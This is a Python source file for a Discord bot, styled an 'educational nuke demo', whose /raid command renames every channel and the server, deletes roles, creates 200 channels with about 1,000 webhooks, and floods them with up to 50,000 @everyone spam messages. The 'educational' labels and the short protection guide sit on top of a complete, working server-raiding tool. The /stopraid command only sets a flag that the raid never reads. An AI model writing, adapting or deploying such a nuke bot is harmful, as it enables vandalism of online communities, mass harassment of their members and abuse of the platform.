import discord
from discord.ext import commands
import asyncio
import os

# ========== CONFIGURATION ==========
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = 1088143400496279552

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)

active_demo = {}

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ FAST Educational Demo Bot ready - {bot.user}")

@bot.tree.command(name="raid", description="[OWNER ONLY] ULTRA-FAST educational nuke")
async def raid(
    interaction: discord.Interaction,
    message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
    ping: str = "yes",
    amount: int = 5000
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can run this.", ephemeral=True)
    
    if not interaction.guild.me.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
    
    await interaction.response.send_message(f"⚡ **ULTRA-FAST EDUCATIONAL DEMO STARTING**\nSending {amount} messages instantly...", ephemeral=False)
    
    ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
    msg_amount = min(amount, 50000)
    ping_text = "@everyone " if ping_enabled else ""
    
    guild = interaction.guild
    active_demo[guild.id] = True
    
    # Create log channel
    log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
    await log_channel.send("💀 **ULTRA-FAST EDUCATIONAL NUKE DEMO** 💀")
    
    try:
        # ========== PARALLEL CHANNEL RENAMING ==========
        await log_channel.send("📢 Renaming all channels...")
        rename_tasks = [channel.edit(name="nuked-by-demo") for channel in guild.channels if channel != log_channel]
        await asyncio.gather(*rename_tasks, return_exceptions=True)
        
        # ========== SERVER RENAME ==========
        await guild.edit(name="🔥 NUKED BY DEMO 🔥")
        
        # ========== PARALLEL ROLE DELETION ==========
        await log_channel.send("📢 Destroying roles...")
        delete_tasks = [role.delete() for role in guild.roles if not role.is_default() and not role.managed and role != guild.me.top_role]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        # ========== CREATE 200 CHANNELS + WEBHOOKS SIMULTANEOUSLY ==========
        await log_channel.send("📢 Creating 200 channels with webhooks simultaneously...")
        
        CHANNEL_COUNT = 200
        WEBHOOKS_PER_CHANNEL = 5
        
        # Create all channels in parallel
        create_tasks = [guild.create_text_channel(f"nuked-{i}") for i in range(CHANNEL_COUNT)]
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        spam_channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        
        await log_channel.send(f"✅ Created {len(spam_channels)} channels")
        
        # Create webhooks for ALL channels in parallel (no waiting)
        await log_channel.send(f"📢 Creating {len(spam_channels) * WEBHOOKS_PER_CHANNEL} webhooks simultaneously...")
        
        all_webhooks = []
        webhook_tasks = []
        for channel in spam_channels:
            for w in range(WEBHOOKS_PER_CHANNEL):
                webhook_tasks.append(channel.create_webhook(name=f"spammer_{w}"))
        
        # Create all webhooks in parallel batches
        batch_size = 50
        for i in range(0, len(webhook_tasks), batch_size):
            batch = webhook_tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            all_webhooks.extend([r for r in results if isinstance(r, discord.Webhook)])
        
        await log_channel.send(f"✅ Created {len(all_webhooks)} webhooks")
        
        # ========== INSTANT SPAM - ALL CHANNELS + WEBHOOKS SIMULTANEOUSLY ==========
        await log_channel.send(f"⚡ INSTANTLY spamming {msg_amount} messages across all channels/webhooks...")
        
        # Prepare message texts
        all_message_texts = [f"{ping_text}{message} [{i+1}/{msg_amount}]" for i in range(msg_amount)]
        
        # Function to spam via webhook
        async def spam_via_webhook(webhook, messages):
            try:
                for msg in messages:
                    await webhook.send(msg)
            except:
                pass
        
        # Function to spam via channel
        async def spam_via_channel(channel, messages):
            try:
                for msg in messages:
                    await channel.send(msg)
            except:
                pass
        
        # Distribute messages across ALL channels and webhooks
        total_targets = len(spam_channels) + len(all_webhooks)
        if total_targets > 0:
            messages_per_target = msg_amount // total_targets + 1
            
            spam_tasks = []
            
            # Spam via channels
            for idx, channel in enumerate(spam_channels):
                start = idx * messages_per_target
                end = min(start + messages_per_target, msg_amount)
                if start < msg_amount:
                    spam_tasks.append(spam_via_channel(channel, all_message_texts[start:end]))
            
            # Spam via webhooks
            for idx, webhook in enumerate(all_webhooks):
                start = (len(spam_channels) + idx) * messages_per_target
                end = min(start + messages_per_target, msg_amount)
                if start < msg_amount:
                    spam_tasks.append(spam_via_webhook(webhook, all_message_texts[start:end]))
            
            # Execute ALL spam simultaneously
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        
        await log_channel.send(f"✅ Successfully spammed {msg_amount} messages!")
        
        # ========== FINAL SUMMARY ==========
        embed = discord.Embed(
            title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
            description=f"**What just happened in SECONDS:**\n\n"
                       f"⚡ **1. Channels Renamed** - All original channels wiped\n"
                       f"⚡ **2. Server Renamed** - Name changed instantly\n"
                       f"⚡ **3. Roles Destroyed** - All protections removed\n"
                       f"⚡ **4. {len(spam_channels)} Spam Channels** - Created instantly\n"
                       f"⚡ **5. {len(all_webhooks)} Webhooks** - Created in parallel\n"
                       f"⚡ **6. {msg_amount} Spam Messages** - Sent simultaneously\n"
                       f"⚡ **7. @everyone Pings** - {'ENABLED' if ping_enabled else 'DISABLED'}\n\n"
                       f"**🚨 REAL ATTACKS HAPPEN THIS FAST - PROTECT YOUR SERVER:**\n"
                       f"• ✅ NEVER give Administrator to untrusted bots\n"
                       f"• ✅ Use 2FA on all admin accounts\n"
                       f"• ✅ Set verification level to HIGH\n"
                       f"• ✅ Use backup bots (Xenon) to save your server\n"
                       f"• ✅ Audit bot permissions weekly\n\n"
                       f"**⚠️ This was an EDUCATIONAL DEMO**\n"
                       f"Delete this test server to clean up.",
            color=discord.Color.red()
        )
        await log_channel.send(embed=embed)
        
        # DM owner
        try:
            owner = await bot.fetch_user(OWNER_ID)
            await owner.send(embed=embed)
        except:
            pass
        
    except Exception as e:
        await log_channel.send(f"❌ Error: {e}")
    finally:
        active_demo[guild.id] = False

@bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop")
async def stopraid(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ Only the bot owner can stop the demo.", ephemeral=True)
    
    if interaction.guild.id in active_demo:
        active_demo[interaction.guild.id] = False
        await interaction.response.send_message("🛑 **Educational demo stopped**", ephemeral=False)
    else:
        await interaction.response.send_message("No active demo.", ephemeral=True)

@bot.tree.command(name="protect", description="How to protect your server")
async def protect(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ How to Protect Your Server from Nuke Bots",
        description="Educational security guide",
        color=discord.Color.green()
    )
    embed.add_field(name="1. NEVER give Admin to untrusted bots", 
                    value="Review permissions before inviting any bot.", inline=False)
    embed.add_field(name="2. Enable 2FA", 
                    value="All administrator accounts must have 2FA.", inline=False)
    embed.add_field(name="3. Server Verification Level", 
                    value="Set to HIGH (member must be registered for 10+ minutes).", inline=False)
    embed.add_field(name="4. Use Backup Bots", 
                    value="Xenon can save/restore your entire server structure.", inline=False)
    embed.add_field(name="5. Audit Logs", 
                    value="Check audit logs regularly for mass channel creation.", inline=False)
    embed.set_footer(text="Educational purposes only - Stay safe!")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="commands", description="Show all commands")
async def cmd_list(interaction: discord.Interaction):
    embed = discord.Embed(
        title="⚡ FAST Educational Nuke Demo Bot",
        description="Ultra-fast demonstration for educational purposes",
        color=discord.Color.blue()
    )
    embed.add_field(name="/raid [message] [ping] [amount]", 
                    value="Start ULTRA-FAST nuke demonstration\n"
                          "• Creates 200 channels + webhooks simultaneously\n"
                          "• Spams thousands of messages instantly\n"
                          "• Shows why you should NEVER give Admin to untrusted bots", 
                    inline=False)
    embed.add_field(name="/stopraid", value="Emergency stop", inline=False)
    embed.add_field(name="/protect", value="Show protection guide", inline=False)
    embed.add_field(name="/commands", value="Show this help", inline=False)
    embed.set_footer(text="⚠️ EDUCATIONAL ONLY - Run on test servers")
    
    await interaction.response.send_message(embed=embed, ephemeral=False)

if __name__ == "__main__":
    if not TOKEN:
        print("ERROR: DISCORD_TOKEN not set")
        exit(1)
    bot.run(TOKEN)
